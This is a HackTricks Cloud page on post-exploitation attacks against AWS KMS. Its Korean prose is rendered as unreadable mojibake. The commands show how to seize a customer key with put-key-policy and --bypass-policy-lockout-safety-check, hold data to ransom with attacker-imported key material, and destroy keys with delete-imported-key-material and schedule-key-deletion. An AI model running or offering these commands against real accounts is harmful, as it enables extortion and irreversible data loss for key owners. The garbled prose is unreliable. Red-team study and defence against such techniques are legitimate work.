# AWS - KMS í›„ë°˜ ê³µê²©

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* íšŒì‚¬ë¥¼ **HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PDFë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

## KMS

ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ ì°¸ì¡°í•˜ì„¸ìš”:

{% content-ref url="../../aws-security/aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../../aws-security/aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### ì •ë³´ ì•”í˜¸í™”/ë³µí˜¸í™”

* **ëŒ€ì¹­** í‚¤ ì‚¬ìš©
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
* **ë¹„ëŒ€ì¹­** í‚¤ë¥¼ ì‚¬ìš©í•˜ëŠ” ë°©ë²•:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS ëœì„¬ì›¨ì–´

KMSì— íŠ¹ê¶Œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” KMS í‚¤ì˜ ì •ì±…ì„ ìˆ˜ì •í•˜ê³  **ìì‹ ì˜ ê³„ì •ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬**í•˜ì—¬, ì •ì‹ ê³„ì •ì— ë¶€ì—¬ëœ ì•¡ì„¸ìŠ¤ë¥¼ ì œê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ëŸ° ë‹¤ìŒ, ì •ì‹ ê³„ì • ì‚¬ìš©ìëŠ” í•´ë‹¹ í‚¤ë¡œ ì•”í˜¸í™”ëœ ì–´ë–¤ ì„œë¹„ìŠ¤ì˜ ì •ë³´ì—ë„ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ì—†ê²Œ ë˜ì–´, ê³„ì •ì— ì‰½ê³  íš¨ê³¼ì ì¸ ëœì„¬ì›¨ì–´ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

{% hint style="warning" %}
AWS ê´€ë¦¬í˜• í‚¤ëŠ” ì´ ê³µê²©ì— ì˜í–¥ì„ ë°›ì§€ ì•Šìœ¼ë©°, ì˜¤ì§ **ê³ ê° ê´€ë¦¬í˜• í‚¤**ë§Œ ì˜í–¥ì„ ë°›ìŠµë‹ˆë‹¤.

ë˜í•œ ì›¹ ì½˜ì†”ì—ì„œ ì´ ì˜µì…˜ì„ ì‚¬ìš©í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ, ì´ ê³µê²©ì€ CLIì—ì„œë§Œ ê°€ëŠ¥í•˜ë„ë¡ **`--bypass-policy-lockout-safety-check`** ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
{% hint style="danger" %}
ì£¼ì˜í•˜ì„¸ìš”. í•´ë‹¹ ì •ì±…ì„ ë³€ê²½í•˜ì—¬ ì™¸ë¶€ ê³„ì •ì—ë§Œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•œ ë‹¤ìŒ, ì´ ì™¸ë¶€ ê³„ì •ì—ì„œ ì›ë˜ ê³„ì •ì— ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë‹¤ì‹œ ë¶€ì—¬í•˜ë ¤ê³  í•˜ë©´ **í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ì¼ë°˜ì ì¸ KMS ëœì„¬ì›¨ì–´

#### ê¸€ë¡œë²Œ KMS ëœì„¬ì›¨ì–´

ê¸€ë¡œë²Œ KMS ëœì„¬ì›¨ì–´ë¥¼ ìˆ˜í–‰í•˜ëŠ” ë˜ ë‹¤ë¥¸ ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ë‹¨ê³„ë¥¼ ë”°ë¦…ë‹ˆë‹¤:

* ê³µê²©ìê°€ ê°€ì ¸ì˜¨ í‚¤ ì¬ë£Œë¡œ ìƒˆë¡œìš´ **í‚¤ ìƒì„±**
* ì´ì „ ë²„ì „ìœ¼ë¡œ ì•”í˜¸í™”ëœ ì´ì „ ë°ì´í„°ë¥¼ ìƒˆë¡œìš´ ë²„ì „ìœ¼ë¡œ **ì¬ì•”í˜¸í™”**
* KMS í‚¤ **ì‚­ì œ**
* ì´ì œ ì›ë˜ í‚¤ ì¬ë£Œë¥¼ ê°€ì§„ ê³µê²©ìë§Œ ì•”í˜¸í™”ëœ ë°ì´í„°ë¥¼ ë³µí˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### í‚¤ íŒŒê´´í•˜ê¸°
```bash
# Destoy they key material previously imported making the key useless
aws kms delete-imported-key-material --key-id 1234abcd-12ab-34cd-56ef-1234567890ab

# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
{% hint style="danger" %}
AWSëŠ” ì´ì œ **ë‹¤ë¥¸ ê³„ì •ì—ì„œ ì´ì „ ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒì„ ë°©ì§€í•©ë‹ˆë‹¤:**
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™‘**](https://peass.creator-spring.com)ì„ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
